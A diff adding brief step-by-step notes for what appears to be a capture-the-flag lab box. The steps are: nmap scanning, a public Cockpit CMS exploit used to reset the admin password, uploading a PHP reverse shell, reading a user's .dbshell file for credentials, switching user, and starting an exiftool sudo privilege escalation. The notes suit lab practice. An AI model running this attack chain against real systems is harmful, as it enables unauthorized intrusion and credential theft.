@@ -1,0 +1,15 @@
+1 - nmap -A 10.10.157.141
+2 - searchsploit "Cockpit CMS 0.11.1"
+3 - searchsploit -m 50185
+4 - python 50185.py -u http://10.10.157.141 -> admin -> reset password (y)
+5 - http://10.10.157.141
+6 - http://10.10.157.141/finder
+7 - cp /usr/share/webshells/php/php-reverse-shell.php .
+8 - http://10.10.157.141/php-reverse-shell.php
+9 - cat /home/stux/.dbshell
+10 - su stux
+11 - cat user.txt
+12 - sudo -l (exiftool)
+13 - searchsploit "exiftool"
+14 - searchsploit -m 50911
+15 - 
